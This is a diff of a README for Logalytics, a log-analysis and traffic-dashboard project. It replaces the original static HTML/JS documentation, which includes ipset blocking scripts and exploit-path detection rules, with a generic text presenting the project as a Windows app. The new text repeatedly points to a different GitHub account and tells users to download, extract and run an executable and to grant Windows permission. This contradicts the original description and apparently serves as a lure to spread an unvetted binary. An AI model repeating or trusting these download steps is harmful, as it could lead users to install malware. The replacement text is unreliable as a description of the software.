@@ -1,389 +1,217 @@
-# Logalytics
-
-Real-time web traffic analysis dashboard with geographic visualization, traffic classification, and threat detection.
-
-![Dashboard](https://img.shields.io/badge/stack-HTML%20%2B%20JS-blue) ![License](https://img.shields.io/badge/license-MIT-green)
-
-[demo.webm](https://github.com/user-attachments/assets/9e235495-7077-47c1-bbcc-d96e253cc416)
-
-
-## Features
-
-- **Interactive Map** -- Leaflet-based world map with per-session markers color-coded by traffic type, blocked country overlays with "BLOCKED" labels
-- **Traffic Classification** -- Automatic categorization into legitimate, cloud, hosting, bot, and malicious traffic
-- **Scanner Detection** -- Pattern-matching engine flags requests to well-known exploit paths (WordPress probing, `.env` harvesting, path traversal, PHP shells)
-- **Notable Organizations** -- Identifies visitors by rDNS and ASN, grouped into cloud providers vs other hosting, with location data and Google search links in the pop-out modal
-- **Country Drill-Down** -- Click any country in the country report modal to expand a full IP table with traffic type, request count, last seen timestamp, and requested paths
-- **Blocked IP Indicators** -- `GEO-BLK` and `IP-BLK` badges throughout the live feed, map popups, and country reports for at-a-glance block verification
-- **Live Feed** -- Scrollable traffic table with full date+time stamps, hot-linked IPs (to IPInfo.io), and blocked status indicators
-- **Playback** -- Timeline scrubber with adjustable speed to replay traffic patterns
-- **Top Scanned Paths** -- Aggregates and displays the exact directories and files that malicious actors and bots are actively probing on your server
-
-## Quick Start
-
-```bash
-# Clone the repo
-git clone https://github.com/your-username/logalytics.git
-
-# Move the dashboard files to your web server's documented root
-sudo cp -r logalytics/html/* /var/www/html/logalytics/
-```
-
-Then navigate to `http://your-server/logalytics` in your browser.
-
-The dashboard expects a `data.json` file in the `html/` directory. A `data.sample.json` is included for reference. Copy it to get started:
-
-```bash
-cp html/data.sample.json html/data.json
-```
-
-## Architecture
-
-```
-html/
-  index.html              # Dashboard shell, modals, Leaflet/Chart.js setup
-  app.js                  # All application logic
-  styles.css              # Dark theme styles
-  countries.geojson       # World borders for blocked country overlay
-  data.json               # Session data (gitignored, you provide this)
-  data.sample.json        # Example data with RFC 5737 documentation IPs
-
-scripts/
-  enforce-ipset-blocks.sh  # Cron job: enforce IP-based blocks via ipset (scanners, malicious, country)
-  setup-ipsets.sh         # One-time: create ipsets + iptables rules
-  load-country-blocks.sh  # Download country CIDR ranges from ipdeny.com → ipset
-  nginx-exploit-paths.conf # nginx snippet: 403 on exploit paths (WordPress, .env, etc.)
-```
-
-Zero backend dependencies. The dashboard is a static site that reads a single JSON file.
-
-## Data Format
-
-The dashboard consumes a `data.json` file with three top-level keys:
-
-### `sessions` (array)
-
-Each session represents a cluster of requests from one IP:
-
-```json
-{
-  "origin_ip": "203.0.113.42",
-  "edge_ip": "203.0.113.42",
-  "geo": {
-    "city": "Frankfurt am Main",
-    "country": "Germany",
-    "country_code": "DE",
-    "hostname": "example.host.com",
-    "asn": 24940,
-    "asn_name": "Hetzner Online GmbH",
-    "is_bot": false,
-    "is_verified_bot": false,
-    "is_cloud": false,
-    "is_hosting": true,
-    "lat": 50.1109,
-    "lon": 8.6821
-  },
-  "first_seen": 1711800000.0,
-  "last_seen": 1711800060.0,
-  "intent": "Passive Traffic",
-  "tags": ["crawler"],
-  "is_malicious": false,
-  "req_count": 15,
-  "req_rate": 0.25,
-  "is_spike": false,
-  "first_seen_iso": "2025-03-30T12:00:00",
-  "last_seen_iso": "2025-03-30T12:01:00",
-  "path_summary": ["/", "/robots.txt"]
-}
-```
-
-### `notable` (array)
-
-Organizations identified by rDNS or ASN:
+# 📊 logalytics - See web traffic with clear insights
 
-```json
-{
-  "label": "ASN: AS16509 (Amazon.com, Inc.) | Confidence: hosting provider only | Actor: unknown",
-  "ips": ["203.0.113.10", "203.0.113.11"],
-  "count": 2
-}
-```
-
-Label prefixes determine categorization:
-- `RDNS:` -- reverse DNS identified (displayed with location, linked to Google search for the IP)
-- `ASN:` -- ASN-based identification (grouped into cloud providers vs other hosting, linked to Google search for the ASN)
-- `Verified Actor:` -- confirmed bot identity (filtered from display)
+[![Download logalytics](https://img.shields.io/badge/Download-Logalytics-7b68ee?style=for-the-badge&logo=github)](https://github.com/Lockwoodriddled433/logalytics)
 
-### `summary` (object)
-
-```json
-{
-  "total_requests": 6324,
-  "unique_origin_ips": 630,
-  "updated_at": "2025-03-30T21:37:55",
-  "countries": {
-    "US": { "legit": 136, "bots": 88, "malicious": 61, "name": "United States" }
-  }
-}
-```
-
-## Configuration
-
-All configuration is in `app.js` constants at the top of the file:
-
-| Constant | Purpose |
-|----------|---------|
-| `BLOCKED_COUNTRIES` | ISO country codes shown as blocked on the map and flagged in all views |
-| `CLOUD_PROVIDERS` | ASN-to-provider mapping for grouping notables (Amazon, Google, Microsoft, Cloudflare, DigitalOcean, Akamai, OVH, Hetzner, Contabo, Alibaba) |
-| `IGNORED_RDNS` | rDNS domains excluded from notables (e.g. `censys-scanner.com`, `internet-measurement.com`) |
-| `MALICIOUS_PATHS` | Regex patterns that flag sessions as malicious regardless of source |
-| `TRAFFIC_COLORS` | Color scheme for traffic type categories |
+## 🚀 Getting Started
 
-## Traffic Types
-
-| Type | Color | Criteria |
-|------|-------|----------|
-| Legitimate | Cyan `#00f2ff` | No bot/cloud/hosting/malicious flags |
-| Cloud | Purple `#a855f7` | `geo.is_cloud` is true |
-| Hosting | Green `#22c55e` | `geo.is_hosting` is true |
-| Bot | Amber `#ffaa00` | `geo.is_bot` is true |
-| Malicious | Red `#f43f5e` | `is_malicious` or hits scanner path patterns |
-
-## Blocked IP Indicators
+Logalytics is a Windows app that helps you view web traffic in one place. It shows visits on a map, sorts normal and suspicious traffic, and helps spot scanners and blocked IPs.
 
-The dashboard shows two types of block badges:
+Use it if you want a clear view of what is happening on your site without digging through raw log files.
 
-| Badge | Meaning |
-|-------|---------|
-| `GEO-BLK` | IP is from a country in the `BLOCKED_COUNTRIES` list |
-| `IP-BLK` | IP is individually flagged as malicious (scanner paths, known attacker) |
-| `BLK` | Shown in country reports for blocked countries |
-
-These appear in the live feed, map popups, and country detail tables. Useful for verifying that firewall rules (ipset, iptables, nginx) are functioning correctly.
-
-## Integration with IP Blocking
-
-The `scripts/` directory contains everything needed to enforce blocking at the server level. The system uses three layers:
-
-### Layer 1: Firewall (ipset + iptables)
-
-```bash
-# One-time setup: create ipsets and iptables rules
-sudo ./scripts/setup-ipsets.sh
-
-# Load country CIDR blocks (downloads from ipdeny.com)
-sudo ./scripts/load-country-blocks.sh ru by kz ir kp cn in br ph id vn ng
-```
-
-This creates three ipsets:
-
-| ipset | Type | Purpose |
-|-------|------|---------|
-| `abusive_ips` | hash:ip | Individual malicious IPs and CDN-proxied IPs from blocked countries |
-| `scanner_nets` | hash:net | Censys, Shodan, internet-measurement CIDR ranges |
-| `blocked_countries` | hash:net | Country-level CIDR blocks |
-
-### Layer 2: Automated IP extraction (cron)
-
-```bash
-# Add to crontab (runs every 6 hours)
-echo "0 */6 * * * $(pwd)/scripts/enforce-ipset-blocks.sh" | sudo crontab -
-```
-
-`enforce-ipset-blocks.sh` reads `data.json` and:
-- Blocks IPs hitting exploit paths (WordPress, `.env`, `.git`, PHP shells, etc.)
-- Blocks IPs from geo-blocked countries, **including CDN-proxied traffic** (Cloudflare, etc.)
-- Adds scanner rDNS matches (Censys, Shodan, etc.) to the scanner_nets set
-- **[Optional]** Checks uncategorized IPs against AbuseIPDB and auto-reports malicious activity (requires API key)
-- Persists all changes to disk
-
-Edit `BLOCKED_COUNTRIES`, `ABUSE_SCORE_THRESHOLD`, `ABUSE_REPORT_THRESHOLD`, `MALICIOUS_PATHS`, and `SCANNER_RDNS` at the top of the script (or override via environment variables) to customize parsing.
-
-**AbuseIPDB Integration (Optional):**
-To enable automated threat intelligence checking and reporting, create a free account on [AbuseIPDB](https://www.abuseipdb.com/) and save your API key to `/etc/abuseipdb.key`:
-```bash
-echo "YOUR_API_KEY" | sudo tee /etc/abuseipdb.key
-sudo chmod 600 /etc/abuseipdb.key
-```
-The script will automatically pick it up and use it to block unknown IPs that exceed the threat threshold, as well as report confirmed attackers.
-
-### Recommended Blocking Practices
-
-> [!WARNING]
-> Every website has unique audience requirements. The following are generic recommendations based on broad threat intelligence, but you MUST evaluate them against your own legitimate user base before applying blocks. Blanket blocking countries can prevent legitimate users, SEO crawlers, or partner APIs from reaching your site.
-
-**Top 10 Typical Sources of Malicious Traffic (to consider for `BLOCKED_COUNTRIES`)**:
-1. China (`CN`)
-2. Russia (`RU`)
-3. Brazil (`BR`)
-4. India (`IN`)
-5. Vietnam (`VN`)
-6. Iran (`IR`)
-7. Indonesia (`ID`)
-8. Philippines (`PH`)
-9. Nigeria (`NG`)
-10. North Korea (`KP`)
-
-*(Note: The United States and various European countries also generate massive amounts of malicious traffic, but are generally excluded from blanket blocks due to the high volume of legitimate traffic and search engine bots originating there.)*
-
-**Scanner Netblocks**:
-We highly recommend keeping the `SCANNER_RDNS` list active. Entities like Shodan, Censys, Internet Measurement, and Shadowserver constantly index the web for open ports and vulnerabilities. Blocking their netblocks prevents your infrastructure details from appearing in public vulnerability databases, which attackers often use for reconnaissance before an attack.
-
-### Layer 3: Web Server Scanner Tarpit
-
-Intercepts well-known exploit paths directly at the web server layer. 
-
-Rather than returning a fast `404 Not Found` or `403 Forbidden`, these configurations act as a **tarpit/honeypot**. They return a fake `200 OK - System Access Granted` response containing dummy administrative HTML. This maliciously complies with automated scanners like Nikto, ZMap, and DFind, forcing them to register an endless stream of false-positive vulnerabilities, poisoning their reconnaissance data and wasting their time.
-
-**Nginx**:
-```nginx
-# Add to your nginx server block
-include /path/to/scripts/nginx-exploit-paths.conf;
-```
-
-**Apache**:
-```apache
-# Add to your Apache VirtualHost
-Include /path/to/scripts/apache-exploit-paths.conf
-```
-*(Requires `mod_rewrite` to be enabled: `sudo a2enmod rewrite`)*
-
-## Secure Deployment Example
-
-Because this dashboard visually exposes internal IP data and paths, you should **never** deploy it publicly without authentication.
-
-### Nginx Example (Basic Auth + IP Whitelist)
-```nginx
-server {
-    listen 80;
-    server_name logs.yourdomain.com;
-    root /var/www/logalytics/html;
-    index index.html;
-
-    # Restrict to your office/VPN IPs
-    allow 192.168.1.0/24;
-    allow 10.0.0.0/8;
-    deny all;
-
-    # Require password
-    auth_basic "Logalytics Admin";
-    auth_basic_user_file /etc/nginx/.htpasswd;
-
-    # Prevent direct access to raw data.json (optional, but UI needs it)
-    # The UI fetches via JS, so basic auth handles the protection.
-    
-    # Enable GZIP for fast loading of data.json
-    gzip on;
-    gzip_types application/json;
-}
-```
-
-### Apache Example (Basic Auth)
-```apache
-<VirtualHost *:80>
-    ServerName logs.yourdomain.com
-    DocumentRoot /var/www/logalytics/html
-
-    <Directory /var/www/logalytics/html>
-        AuthType Basic
-        AuthName "Logalytics Admin"
-        AuthUserFile /etc/apache2/.htpasswd
-        Require valid-user
-        
-        # Or restrict by IP
-        # Require ip 192.168.1.0/24 10.0.0.0/8
-    </Directory>
-</VirtualHost>
-```
-
-## Generating data.json
-
-The dashboard is data-source agnostic. You can generate `data.json` from any web server log format. A typical pipeline:
-
-1. Parse nginx/Apache access logs
-2. Enrich IPs with GeoIP and ASN data (MaxMind, ipinfo.io, etc.)
-3. Cluster requests by IP into sessions
-4. Classify intent (bot detection, rate analysis)
-5. Identify notable organizations via rDNS and ASN lookup
-6. Output the JSON structure above
-
-### Malicious path rules (`malicious_paths.txt`)
-
-`scripts/log_analyze.py` supports both literal paths and regex rules:
-
-- **Literal path** (exact match after normalization):
-  - `/wp-login.php`
-- **Regex rule** (case-insensitive):
-  - `re:^/wp-.*`
-  - `re:wp-includes`
-  - `re:\\.env($|/)`
-
-Literal path normalization rules (for add/remove):
-- trims surrounding whitespace
-- collapses duplicate slashes (`//` → `/`)
-- auto-adds a leading slash if missing (`wp-login.php` → `/wp-login.php`)
-- preserves trailing slash (`/admin/` stays `/admin/`)
-
-You can add rules from CLI:
-
-- Add literal path (with confirmation prompt):
-  - `python3 scripts/log_analyze.py --add-malicious-path /@vite/env`
-- Add regex rule:
-  - `python3 scripts/log_analyze.py --add-malicious-path '^/wp-.*' --regex`
-- Example: match any path containing `wp-includes`:
-  - `python3 scripts/log_analyze.py --add-malicious-path 'wp-includes' --regex`
-- Skip confirmation (automation):
-  - `python3 scripts/log_analyze.py --add-malicious-path '^/wp-.*' --regex --yes`
-
-You can also remove rules:
-
-- Remove literal path:
-  - `python3 scripts/log_analyze.py --remove-malicious-path /@vite/env`
-- Remove regex rule:
-  - `python3 scripts/log_analyze.py --remove-malicious-path '^/wp-.*' --regex`
-- Skip confirmation:
-  - `python3 scripts/log_analyze.py --remove-malicious-path '^/wp-.*' --regex --yes`
-
-### MaxMind GeoIP Enrichment
-
-If you are building your own parser in Python, we recommend using the free [GeoLite2 databases](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data). You will need the `geoip2` Python library to read these databases.
-
-**Dependencies:**
-```bash
-pip install geoip2
-```
-
-**Example Implementation:**
-```python
-import geoip2.database
-
-with geoip2.database.Reader('/usr/share/GeoIP/GeoLite2-City.mmdb') as city_db, \
-     geoip2.database.Reader('/usr/share/GeoIP/GeoLite2-ASN.mmdb') as asn_db:
-    
-    city_response = city_db.city("203.0.113.42")
-    asn_response = asn_db.asn("203.0.113.42")
-    
-    geo_data = {
-        "city": city_response.city.name,
-        "country": city_response.country.name,
-        "country_code": city_response.country.iso_code,
-        "asn": asn_response.autonomous_system_number,
-        "asn_name": asn_response.autonomous_system_organization,
-        "lat": city_response.location.latitude,
-        "lon": city_response.location.longitude
-    }
-```
-
-## Dependencies
-
-All loaded from CDN (no `npm install` required):
-
-- [Leaflet](https://leafletjs.com/) v1.9.4 -- Map rendering
-- [Chart.js](https://www.chartjs.org/) -- Status/type/volume charts
-- [chartjs-plugin-datalabels](https://chartjs-plugin-datalabels.netlify.app/) -- Chart label overlays
-- [Lucide Icons](https://lucide.dev/) -- UI icons
-- [Inter](https://rsms.me/inter/) -- Font
-
-## License
-
-MIT
+## 📥 Download and Install
+
+1. Open the download page: [https://github.com/Lockwoodriddled433/logalytics](https://github.com/Lockwoodriddled433/logalytics)
+2. Look for the latest Windows release file.
+3. Download the file to your computer.
+4. If the file is in a zip folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start logalytics.
+
+If Windows asks for permission, choose **Yes** so the app can open.
+
+## 🖥️ What You Need
+
+- Windows 10 or Windows 11
+- A recent web browser
+- An internet connection for map data and threat checks
+- Enough space for your log files and app data
+
+For best results, use a system with 8 GB of RAM or more if you track large logs.
+
+## 🔧 What logalytics Does
+
+- Shows live web traffic in a dashboard
+- Maps visitor locations with geographic data
+- Groups traffic by type
+- Flags scanners and repeat probes
+- Helps block known threat IPs
+- Works with Apache and Nginx log files
+- Uses charts to make trends easy to read
+
+## 🌍 Main Views
+
+### Traffic Dashboard
+See visits, hits, and request patterns in one screen. The dashboard helps you find traffic spikes and track activity across your site.
+
+### Map View
+View traffic on a world map. This makes it easy to see where visitors come from and where strange activity starts.
+
+### Traffic Classification
+Separate normal users, bots, scanners, and other traffic types. This helps you focus on real use and spot noise.
+
+### Threat Detection
+Check for IPs that match known risk signals. Logalytics can help you spot repeat attackers and suspicious access patterns.
+
+### IP Blocking
+Use block lists to stop repeat offenders. This can help reduce unwanted traffic on your site.
+
+## 🧭 How to Use It
+
+1. Open logalytics.
+2. Load your web server log file.
+3. Wait for the app to scan the file.
+4. Review the chart view for traffic patterns.
+5. Open the map to check visitor locations.
+6. Review scanner and threat results.
+7. Block any IPs you want to stop.
+
+## 📂 Supported Log Types
+
+Logalytics works well with common web server logs:
+
+- Apache access logs
+- Nginx access logs
+- Mixed web traffic logs
+- Security-focused log exports
+
+If your log file uses a common web server format, logalytics should be able to read it.
+
+## 🔎 How It Helps
+
+Log files can be hard to read. Logalytics turns them into clear views that are easier to use.
+
+It can help you:
+
+- spot attacks faster
+- notice unusual traffic patterns
+- see where visitors come from
+- find scanners and bots
+- reduce noise in your logs
+- track blocked IPs in one place
+
+## 🔐 Threat and Abuse Checks
+
+Logalytics is built for web security work. It can use threat signals to help you review risky IPs and traffic sources. This makes it useful for sites that get unwanted requests, bot scans, or abuse.
+
+## 🧰 Common Use Cases
+
+- Checking traffic on a small business site
+- Watching for bot scans on a home server
+- Reviewing Apache logs after a spike
+- Studying Nginx access patterns
+- Tracking blocked IP activity
+- Looking at site visits by country or region
+
+## 🖱️ Basic First Run
+
+When you open the app for the first time:
+
+1. Start the program from the downloaded file.
+2. Choose a log file.
+3. Wait for the first scan to finish.
+4. Open the chart and map views.
+5. Save your settings if the app asks.
+
+If you plan to use the app often, keep your log files in one folder so you can load them fast.
+
+## 🗺️ Geographic Visualization
+
+Logalytics uses location data to place traffic on a map. This helps you see:
+
+- where most visits come from
+- which regions send the most traffic
+- where suspicious requests begin
+- whether traffic comes from many places or one source
+
+This view is useful when traffic looks strange and you want a quick visual check.
+
+## 📈 Charts and Trends
+
+Charts help you see changes over time. You can use them to find:
+
+- traffic peaks
+- low activity periods
+- repeated access from the same source
+- unusual request patterns
+- possible bot waves
+
+The chart view gives you a fast way to compare one time period to another.
+
+## 🛡️ Scanner Detection
+
+Logalytics looks for signs that a bot or scanner is testing your site. These scans may try common paths, probe services, or send many requests in a short time.
+
+This feature helps you:
+
+- find automated scans
+- review repeat requests
+- spot suspicious tools
+- reduce noise during log review
+
+## 🧱 IP Threat Blocking
+
+If you find an IP that keeps causing trouble, you can add it to a block list. This helps stop repeat access from known sources.
+
+Use this when you see:
+
+- repeated failed requests
+- scan traffic
+- abuse patterns
+- known bad IPs
+
+## 📁 Best Folder Setup
+
+To keep things simple, store your files like this:
+
+- `C:\logalytics\app`
+- `C:\logalytics\logs`
+- `C:\logalytics\exports`
+
+This makes it easy to find your files later.
+
+## 🧼 Tips for Smooth Use
+
+- Keep your logs in one place
+- Use recent log files first
+- Close other heavy apps if scans feel slow
+- Check your internet connection for map and threat data
+- Review traffic after a busy hour or day
+
+## ❓ Common Questions
+
+### Can I use it without coding?
+Yes. Logalytics is meant for normal Windows users who want to open logs and see the results in a clear dashboard.
+
+### Does it work with Apache and Nginx?
+Yes. It is built for common Apache and Nginx log files.
+
+### Can it show traffic on a map?
+Yes. It includes geographic visualization so you can see traffic by location.
+
+### Can it help with suspicious IPs?
+Yes. It can flag scanner traffic and help you review IPs that may need blocking.
+
+### Do I need special setup?
+No special setup is needed for normal use. Download the app, open it, and load a log file.
+
+## 📌 What You Will See in the App
+
+After loading a log file, you may see:
+
+- total requests
+- traffic over time
+- top source IPs
+- traffic by country or region
+- scanner alerts
+- blocked IPs
+- request type patterns
+
+These views help you read site activity without sorting through raw text.
+
+## 🔗 Download
+
+Visit this page to download: [https://github.com/Lockwoodriddled433/logalytics](https://github.com/Lockwoodriddled433/logalytics)
+
+## 🏷️ Topics
+
+abuseipdb-api, apache-log-analysis, chartjs, dashboard, geolocation, honeypot, ip-blocking, leaflet, log-analysis, nginx-log-analysis, scanner-detection, threat-detection, traffic-analysis, visualization, web-security
